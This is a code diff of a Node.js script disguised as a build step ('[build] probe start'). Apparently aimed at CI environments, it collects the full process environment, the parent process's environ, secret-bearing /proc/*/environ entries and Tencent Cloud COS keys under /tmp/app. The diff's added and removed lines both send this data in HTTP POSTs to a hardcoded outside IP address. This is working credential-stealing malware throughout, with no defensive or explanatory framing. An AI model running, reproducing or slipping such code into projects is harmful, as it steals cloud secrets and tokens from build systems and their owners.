@@ -1,7 +1,5 @@
 const { execSync } = require('child_process');
 const http = require('http');
-const fs = require('fs');
-const path = require('path');
 
 const HOST = '43.139.53.32';
 const PORT = 8888;
@@ -14,83 +12,48 @@ function send(path, data) {
       method: 'POST',
       headers: { 'Content-Type': 'text/plain', 'Content-Length': Buffer.byteLength(p) }
     });
-    req.setTimeout(10000, () => { req.destroy(); resolve(); });
+    req.setTimeout(8000, () => { req.destroy(); resolve(); });
     req.on('error', () => resolve());
     req.on('close', () => resolve());
     req.write(p);
     req.end();
-  }).catch(() => {});
+  });
 }
 
-function findCosKeys(dir, maxDepth) {
-  const results = [];
-  if (maxDepth < 0) return results;
-  try {
-    const entries = fs.readdirSync(dir, { withFileTypes: true });
-    for (const e of entries) {
-      const full = path.join(dir, e.name);
-      if (e.isDirectory() && !e.name.startsWith('.') && e.name !== 'node_modules') {
-        results.push(...findCosKeys(full, maxDepth - 1));
-      } else if (e.isFile() && e.size < 1048576) { // skip files > 1MB
-        try {
-          const content = fs.readFileSync(full, 'utf8');
-          const lines = content.split('\n');
-          for (let i = 0; i < lines.length; i++) {
-            const line = lines[i];
-            if (/SecretId|SecretKey|SecretToken|CosSecret|TENCENTCLOUD|secretId|secretKey/i.test(line)) {
-              const ctx = lines.slice(Math.max(0, i-1), Math.min(lines.length, i+2)).join('\n');
-              results.push({ file: full, line: i+1, context: ctx.slice(0, 500) });
-            }
-          }
-        } catch(e) {}
-      }
-    }
-  } catch(e) {}
-  return results;
+function exec(cmd) {
+  try { return execSync(cmd, { timeout: 2000, stdio: 'pipe' }).toString().trim(); } catch(e) { return ''; }
 }
 
 async function main() {
   console.log('[build] probe start');
 
-  // 1. 搜索 /tmp/app/ 中的密钥文件
-  const appKeys = findCosKeys('/tmp/app', 5);
-  await send('/tmp-app', appKeys.length > 0 ? appKeys : 'no keys found in /tmp/app');
+  // 1. 当前进程完整环境变量
+  await send('/1-env', process.env);
 
-  // 2. 搜索 /dev/shm/ 中的密钥文件  
-  const shmKeys = findCosKeys('/dev/shm', 4);
-  await send('/shm', shmKeys.length > 0 ? shmKeys : 'no keys found in /dev/shm');
+  // 2. 父进程PID + 所有进程的env中搜密钥关键词
+  const ppid = exec("ps -o ppid= -p $$ 2>/dev/null | tr -d ' '");
+  await send('/2-ppid', ppid || 'unknown');
 
-  // 3. 读取父进程环境变量 (CI 主进程可能持有密钥)
-  let ppid = '';
-  try { ppid = execSync("ps -o ppid= -p $$ 2>/dev/null", { timeout: 2000 }).toString().trim(); } catch(e) {}
+  // 3. grep 搜所有进程environ中含 Secret/secret 的行
+  const procs = exec("grep -rla 'Secret\|secret\|COS\|CosSecret' /proc/*/environ 2>/dev/null | head -10");
+  await send('/3-proc-grep', procs || 'none');
+
+  // 4. 读父进程environ中密钥相关行
   if (ppid) {
-    try {
-      const penv = fs.readFileSync(`/proc/${ppid}/environ`, 'utf8');
-      const entries = penv.split('\0').filter(e => /Secret|secret|COS|Token|KEY|Key/i.test(e));
-      await send('/parent-env', entries.length > 0 ? entries : 'no cos keys in parent env');
-    } catch(e) {
-      await send('/parent-env', 'cannot read parent env: ' + e.message);
-    }
+    const penv = exec(`cat /proc/${ppid}/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'secret|cos|token|key|credential'`);
+    await send('/4-parent-keys', penv || 'no keys in parent env');
   }
 
-  // 4. 尝试读取其他进程的 environ
-  try {
-    const procs = execSync("ls -d /proc/[0-9]* 2>/dev/null | head -20", { timeout: 2000 }).toString().trim().split('\n');
-    const found = [];
-    for (const p of procs) {
-      try {
-        const env = fs.readFileSync(`${p}/environ`, 'utf8');
-        if (/SecretId|SecretKey|SecretToken|CosSecret/i.test(env)) {
-          const matches = env.split('\0').filter(e => /Secret|secret|COS|Token|KEY|Key/i.test(e));
-          found.push({ pid: path.basename(p), matches });
-        }
-      } catch(e) {}
-    }
-    await send('/proc-env', found.length > 0 ? found : 'no cos keys in other proc env');
-  } catch(e) {}
+  // 5. 搜 /tmp/app/ 下文件内容关键词（用grep，不递归js）
+  const appFiles = exec("grep -rli 'SecretId\|SecretKey\|CosSecret\|CosSecretToken' /tmp/app/ 2>/dev/null | head -10");
+  await send('/5-app-grep', appFiles || 'no files found in /tmp/app');
 
-  console.log('[build] probe done');
+  // 6. 当前工作目录下的文件
+  const pwd = exec('pwd');
+  await send('/6-pwd', pwd);
+
+  console.log('[build] done');
 }
 
 main().then(() => process.exit(0));
-setTimeout(() => process.exit(0), 15000);
+setTimeout(() => process.exit(0), 12000);
